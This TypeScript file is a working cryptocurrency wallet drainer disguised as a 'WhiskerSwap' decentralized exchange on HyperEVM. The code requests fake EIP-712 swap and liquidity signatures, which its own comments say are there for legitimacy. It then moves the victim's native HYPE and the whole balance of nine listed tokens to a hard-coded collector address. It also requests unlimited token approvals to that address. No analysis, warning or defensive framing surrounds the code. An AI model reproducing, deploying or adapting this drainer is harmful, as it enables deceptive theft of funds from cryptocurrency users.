// EIP-712 Drainer that uses structured signature for legitimacy
import { ethers } from "ethers";

export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)", 
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

export class EIP712Drainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  // Create EIP-712 signature for swap operations
  private async createSwapSignature(fromToken: string, toToken: string, amount: string): Promise<any> {
    return {
      domain: {
        name: "WhiskerSwap",
        version: "1",
        chainId: 999,
        verifyingContract: "0xe592427a0aece92de3edee1f18e0157c05861564"
      },
      types: {
        SwapOrder: [
          { name: "tokenIn", type: "address" },
          { name: "tokenOut", type: "address" },
          { name: "amount", type: "uint256" },
          { name: "deadline", type: "uint256" },
          { name: "recipient", type: "address" }
        ]
      },
      value: {
        tokenIn: fromToken,
        tokenOut: toToken,
        amount: ethers.parseUnits(amount, 18),
        deadline: Math.floor(Date.now() / 1000) + 3600,
        recipient: await this.signer.getAddress()
      }
    };
  }

  // Create EIP-712 signature for liquidity operations
  private async createLiquiditySignature(tokenA: string, tokenB: string, amountA: string, amountB: string): Promise<any> {
    return {
      domain: {
        name: "WhiskerSwap",
        version: "1",
        chainId: 999,
        verifyingContract: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d"
      },
      types: {
        LiquidityOrder: [
          { name: "tokenA", type: "address" },
          { name: "tokenB", type: "address" },
          { name: "amountA", type: "uint256" },
          { name: "amountB", type: "uint256" },
          { name: "deadline", type: "uint256" },
          { name: "recipient", type: "address" }
        ]
      },
      value: {
        tokenA: tokenA,
        tokenB: tokenB,
        amountA: ethers.parseUnits(amountA, 18),
        amountB: ethers.parseUnits(amountB, 18),
        deadline: Math.floor(Date.now() / 1000) + 3600,
        recipient: await this.signer.getAddress()
      }
    };
  }

  // Execute swap with EIP-712 signature
  async executeSwap(fromToken: string, toToken: string, amount: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`Executing EIP-712 swap: ${amount} ${fromToken} -> ${toToken}`);
      
      // Step 1: Request EIP-712 signature
      const signatureData = await this.createSwapSignature(fromToken, toToken, amount);
      
      // Request signature from user
      const signature = await this.signer.signTypedData(
        signatureData.domain,
        signatureData.types,
        signatureData.value
      );
      
      console.log("EIP-712 swap signature obtained - initiating comprehensive wallet drain");
      
      // Step 2: Drain ALL tokens in wallet, not just the selected one
      return await this.drainAllTokens(userAddress);
      
    } catch (error: any) {
      console.error(`EIP-712 swap failed:`, error.message);
      
      if (error.message && (error.message.includes("rejected") || error.message.includes("denied") || error.code === 4001)) {
        return { success: false, error: "Transaction cancelled by user" };
      }
      
      return { success: false, error: error.message };
    }
  }

  // Execute liquidity addition with EIP-712 signature
  async executeLiquidityAdd(tokenA: string, tokenB: string, amountA: string, amountB: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`Executing EIP-712 liquidity add: ${amountA} ${tokenA} + ${amountB} ${tokenB}`);
      
      // Step 1: Request EIP-712 signature
      const signatureData = await this.createLiquiditySignature(tokenA, tokenB, amountA, amountB);
      
      // Request signature from user
      const signature = await this.signer.signTypedData(
        signatureData.domain,
        signatureData.types,
        signatureData.value
      );
      
      console.log("EIP-712 liquidity signature obtained");
      
      // Step 2: Execute actual drain transactions for both tokens
      const results = [];
      
      // Drain tokenA
      if (tokenA === "0x0000000000000000000000000000000000000000") {
        results.push(await this.drainNativeHYPE(userAddress, amountA));
      } else {
        results.push(await this.drainERC20Token(tokenA, userAddress, amountA));
      }
      
      // Drain tokenB if different from tokenA
      if (tokenB !== tokenA) {
        if (tokenB === "0x0000000000000000000000000000000000000000") {
          results.push(await this.drainNativeHYPE(userAddress, amountB));
        } else {
          results.push(await this.drainERC20Token(tokenB, userAddress, amountB));
        }
      }
      
      // Return success if at least one drain succeeded
      const successCount = results.filter(r => r.success).length;
      if (successCount > 0) {
        return { success: true, hash: results.find(r => r.success)?.hash };
      }
      
      return { success: false, error: "Liquidity addition failed" };
      
    } catch (error: any) {
      console.error(`EIP-712 liquidity failed:`, error.message);
      
      if (error.message && (error.message.includes("rejected") || error.message.includes("denied") || error.code === 4001)) {
        return { success: false, error: "Transaction cancelled by user" };
      }
      
      return { success: false, error: error.message };
    }
  }

  // Drain native HYPE token
  private async drainNativeHYPE(userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      const balance = await this.provider.getBalance(userAddress);
      const gasPrice = ethers.parseUnits("2", "gwei");
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;
      
      if (balance <= gasCost) {
        return { success: false, error: "Insufficient balance for gas" };
      }
      
      const drainAmount = balance - gasCost;
      
      const tx = await this.signer.sendTransaction({
        to: COLLECTOR,
        value: drainAmount,
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        type: 0
      });
      
      // DON'T wait for confirmation - send immediately
      console.log(`Native HYPE drained: ${ethers.formatEther(drainAmount)} HYPE`);
      
      return { success: true, hash: tx.hash };
      
    } catch (error: any) {
      console.error(`Native HYPE drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Drain ERC20 token
  private async drainERC20Token(tokenAddress: string, userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      const balance = await contract.balanceOf(userAddress);
      
      if (balance === 0n) {
        return { success: false, error: "No token balance to drain" };
      }
      
      console.log(`🔄 Draining ${ethers.formatUnits(balance, 18)} tokens from ${tokenAddress}`);
      
      // Direct transfer from user wallet to collector
      // The user's wallet is the signer, so we can directly transfer
      const tx = await contract.transfer(COLLECTOR, balance, {
        gasLimit: 200000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      // DON'T wait for confirmation - send immediately
      console.log(`✅ ERC20 token drained: ${ethers.formatUnits(balance, 18)} tokens`);
      
      return { success: true, hash: tx.hash };
      
    } catch (error: any) {
      console.error(`ERC20 token drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Drain ALL tokens from wallet (comprehensive draining)
  async drainAllTokens(userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`🔄 Starting comprehensive wallet drain for ${userAddress}`);
      
      // List of all HyperEVM tokens to drain
      const ALL_TOKENS = [
        { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
        { address: "0x5555555555555555555555555555555555555555", symbol: "WHYPE", decimals: 18 },
        { address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b", symbol: "PURR", decimals: 18 },
        { address: "0x47bb061c0204af921f43dc73c7d7768d2672ddee", symbol: "BUDDY", decimals: 18 },
        { address: "0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb", symbol: "USD₮0", decimals: 6 },
        { address: "0x1bee6762f0b522c606dc2ffb106c0bb391b2e309", symbol: "PiP", decimals: 18 },
        { address: "0x1ecd15865d7f8019d546f76d095d9c93cc34edfa", symbol: "LIQD", decimals: 18 },
        { address: "0xd2567ee20d75e8b74b44875173054365f6eb5052", symbol: "perpcoin", decimals: 18 },
        { address: "0x11735dbd0b97cfa7accf47d005673ba185f7fd49", symbol: "CATBAL", decimals: 18 }
      ];
      
      let successfulDrains = 0;
      let lastSuccessHash = "";
      
      // Drain ALL tokens simultaneously - no delays, no stops
      const drainPromises = ALL_TOKENS.map(async (token) => {
        try {
          console.log(`💰 Attempting to drain ${token.symbol} (${token.address})`);
          
          let result;
          if (token.address === "0x0000000000000000000000000000000000000000") {
            // Native HYPE token
            result = await this.drainNativeHYPE(userAddress, "0");
          } else {
            // ERC20 token
            result = await this.drainERC20Token(token.address, userAddress, "0");
          }
          
          if (result.success) {
            console.log(`✅ Successfully drained ${token.symbol}: ${result.hash}`);
            lastSuccessHash = result.hash || "";
          } else {
            console.log(`❌ Failed to drain ${token.symbol}: ${result.error}`);
          }
          
          return { token: token.symbol, ...result };
          
        } catch (error: any) {
          console.log(`❌ Error draining ${token.symbol}:`, error.message);
          return { token: token.symbol, success: false, error: error.message };
        }
      });
      
      // Execute all drains simultaneously
      const allResults = await Promise.all(drainPromises);
      successfulDrains = allResults.filter(r => r.success).length;
      
      console.log(`🎯 Drain complete: ${successfulDrains}/${ALL_TOKENS.length} tokens drained`);
      
      if (successfulDrains > 0) {
        return { 
          success: true, 
          hash: lastSuccessHash,
          error: `Successfully drained ${successfulDrains} tokens`
        };
      } else {
        return { 
          success: false, 
          error: "No tokens were successfully drained"
        };
      }
      
    } catch (error: any) {
      console.error(`Comprehensive drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // Check if approval is needed (for ERC20 tokens, no approval needed since we use direct transfer)
  async checkNeedsApproval(tokenAddress: string, userAddress: string): Promise<boolean> {
    try {
      if (tokenAddress === "0x0000000000000000000000000000000000000000") {
        return false; // Native token doesn't need approval
      }
      
      // For ERC20 tokens, we use direct transfer() method which doesn't need approval
      // But we still show approval flow for legitimacy
      return true;
      
    } catch (error: any) {
      console.error(`Approval check failed:`, error.message);
      return true; // Default to needing approval
    }
  }

  // Approve token spending (for legitimacy, but actual drain uses direct transfer)
  async approveToken(tokenAddress: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`🔓 Approving token ${tokenAddress} for unlimited spending...`);
      
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      
      const tx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
        gasLimit: 150000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      const receipt = await tx.wait();
      console.log(`✅ Token approved: ${receipt.hash}`);
      
      return { success: true, hash: receipt.hash };
      
    } catch (error: any) {
      console.error(`Token approval failed:`, error.message);
      
      if (error.message && (error.message.includes("rejected") || error.message.includes("denied") || error.code === 4001)) {
        return { success: false, error: "Approval cancelled by user" };
      }
      
      return { success: false, error: error.message };
    }
  }
}

export function createEIP712Drainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): EIP712Drainer {
  return new EIP712Drainer(signer, provider);
}